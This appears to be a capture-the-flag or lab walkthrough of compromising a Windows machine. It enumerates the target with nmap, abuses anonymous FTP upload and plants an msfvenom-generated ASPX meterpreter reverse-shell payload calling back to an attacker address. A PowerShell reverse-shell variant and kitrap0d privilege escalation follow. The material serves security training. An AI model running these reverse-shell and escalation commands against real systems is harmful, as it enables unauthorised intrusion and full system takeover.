# Enumeration

- we use nmap to enumerate `nmap -p- -A -T4 10.10.10.5`![](attachment/b7cf63eb8c6ea51d86bad5ccb3c8dc1f.png)
- We found anonymous access in ftp
- We found a website hosted on the IP (poor hygiene) ![](attachment/f778a60dd8010e74464e3e2141b07f8d.png)
- using *dirbuster* to bust the directories:![](attachment/0715e3cd286726b8c2def1a6f181be9c.png) We found nothing : (
### FTP
We can anonymously login into ftp and upload files:**![](attachment/67d502c19c3c0856ceb60eca4d6888b3.png)
We can exploit this and use to our advantage
# Exploitation
- We can use this cheatsheat: https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom and use the ASP/x payload.
- To output the ex.aspx file with the payload: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.9 LPORT=4444 -f aspx > ex.aspx `
- we use `msfconsole` to listen on port 4444
- upload to ftp by binary preferably. ![](attachment/40025786967ebd9c87b2dcf1c8eda781.png)
- WE GET A METERPRETER SHELL!!!!
	-![](attachment/e309c275f762cf167d314aa32e6ac6a9.png)
- we can als0 use `msfvenom -p windows/powershell/powershell_reverse_tcp LHOST=10.10.16.9 ` to gain access without metasploit.
- We can use post exploit called suggester: ![](attachment/d5d0fc85ef20a7e45f6cd086614fdcce.png)
- Post exploitation using kitrap0d for privilege escalation we got admin access![](attachment/132af84569da1d754fd6b02a49fc1b5c.png)